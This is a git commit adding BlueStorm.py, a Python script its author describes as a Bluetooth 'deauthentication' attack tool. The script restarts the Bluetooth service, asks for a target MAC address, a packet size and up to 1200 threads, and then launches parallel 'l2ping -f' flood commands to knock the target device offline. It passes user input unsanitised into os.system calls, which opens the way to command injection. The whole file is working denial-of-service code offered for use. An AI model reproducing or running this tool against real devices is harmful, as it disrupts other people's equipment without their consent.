505f92610457683a2ee8ea3db0773290eabfecb9
WireBits <159493381+wirebits@users.noreply.github.com>
2024-08-11 16:15:02 +0530

    Add files via upload

---
+++ BlueStorm.py
@@ -0,0 +1,101 @@
+# BlueStorm
+# A tool which perform deauthentication attack on unpaired bluetooth devices.
+# Author - WireBits
+
+import os
+import time
+import threading
+import subprocess
+
+RED = '\033[91m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+CYAN='\033[0;36m'
+RESET = '\033[0m'
+
+def bluetooth_deauthentication(bluetooth_interface, packet_size, target_address):
+    os.system(f'l2ping -i {bluetooth_interface} -s {packet_size} -f {target_address}')
+
+def logo():
+    print(f"""
+                {RED}  ....  {RESET}
+                {RED} .-@@%-.{RESET}
+                {RED} .-@@@@#:. {RESET}
+                {RED} .-@@@@@@#. {RESET}
+                {RED} .-@@+:#@@@*. {RESET}
+                {RED} .-@@+. :%@@@+. {RESET}
+        {RED} .:**:.  .-@@+.   -@@@@=. {RESET}
+        {RED} .+@@@#. .-@@+.   .%@@@+. {RESET}
+        {RED} .:#@@@#.-@@+. .#@@@#.. {RESET}                 {RED}╔╗ ╦  ╦ ╦╔═╗╔═╗╔╦╗╔═╗╦═╗╔╦╗{RESET}
+        {RED}    .:@@@@@@@+.*@@@%:. {RESET}                  {RED}╠╩╗║  ║ ║║╣ ╚═╗ ║ ║ ║╠╦╝║║║{RESET}
+        {RED}      .:@@@@@@@@@@.. {RESET}                    {RED}╚═╝╩═╝╚═╝╚═╝╚═╝ ╩ ╚═╝╩╚═╩ ╩{RESET}
+        {RED}      .-@@@@@@-. {RESET}                       {RED}Bluetooth Deauthentication Tool{RESET}
+        {RED}      .:@@@@@@:. {RESET}                     {RED}+---------------------------------+{RESET}
+        {RED}      :@@@@@@@@@@. {RESET}                           {RED}Author : WireBits{RESET}
+        {RED}    .:@@@@@@@+.#@@@%.. {RESET}
+        {RED}  .:#@@@#.-@@+. .#@@@#.. {RESET}
+        {RED} .+@@@%. .-@@+.   .%@@@+. {RESET}
+        {RED} .:*#:.  .-@@+.   :@@@@=. {RESET}
+        {RED}         .-@@+. :%@@@*. {RESET}
+        {RED}         .-@@+:#@@@#. {RESET}
+        {RED}         .-@@@@@@%. {RESET}
+        {RED}         .-@@@@%:. {RESET}
+        {RED}         .-@@%-. {RESET}
+        {RED}          ....  {RESET}
+    """)
+
+def main():
+    subprocess.check_output("sudo service bluetooth restart", shell=True, stderr=subprocess.STDOUT, text=True)
+    os.system('clear')
+    logo()
+    print("")
+
+    bluetooth_interface = input(f'{GREEN}[*]{RESET} {YELLOW}Bluetooth Interface (e.g. hci0){RESET} {CYAN}>{RESET} ')
+    if not bluetooth_interface:
+        print(f'{RED}[!]{RESET} {RED}Bluetooth Interface not entered!{RESET}')
+        exit(0)
+
+    target_address = input(f'{GREEN}[*]{RESET} {YELLOW}Target ID or MAC Address{RESET} {CYAN}>{RESET} ')
+    if len(target_address) < 1:
+        print(f'{RED}[!]{RESET} {RED}Target address not entered!{RESET}')
+        exit(0)
+
+    try:
+        packet_size = int(input(f'{GREEN}[*]{RESET} {YELLOW}Packet Size (Max : 600){RESET} {CYAN}>{RESET} '))
+        if packet_size <= 0 or packet_size > 600:
+            raise ValueError
+    except ValueError:
+        print(f'{RED}[!]{RESET} {RED}Packet size must be an integer between 1 and 600!{RESET}')
+        exit(0)
+
+    try:
+        threads_count = int(input(f'{GREEN}[*]{RESET} {YELLOW}Number of threads (Max : 1200){RESET} {CYAN}>{RESET} '))
+        if threads_count <= 0 or threads_count > 1200:
+            raise ValueError
+    except ValueError:
+        print(f'{RED}[!]{RESET} {RED}Number of threads must be an integer between 1 and 1200!{RESET}')
+        exit(0)
+
+    print("")
+    os.system('clear')
+
+    for i in range(3, 0, -1):
+        countdown_message = f"{GREEN}[*]{RESET} {YELLOW}Starting deauthentication attack in{RESET} {RED}{i}{RESET} {YELLOW}seconds...{RESET}"
+        print(countdown_message, end='\r')
+        time.sleep(1)
+    os.system('clear')
+
+    print(f'{GREEN}[*]{RESET} {YELLOW}Building threads...{RESET}')
+
+    for _ in range(threads_count):
+        threading.Thread(target=bluetooth_deauthentication, args=[bluetooth_interface, packet_size, target_address]).start()
+
+    print(f'{GREEN}[*]{RESET} {YELLOW}Threads built!{RESET}')
+    print(f'{GREEN}[*]{RESET} {YELLOW}Attack Started!{RESET}')
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f'{RED}[!]{RESET} {RED}Aborted!{RESET}')
+        exit(0)
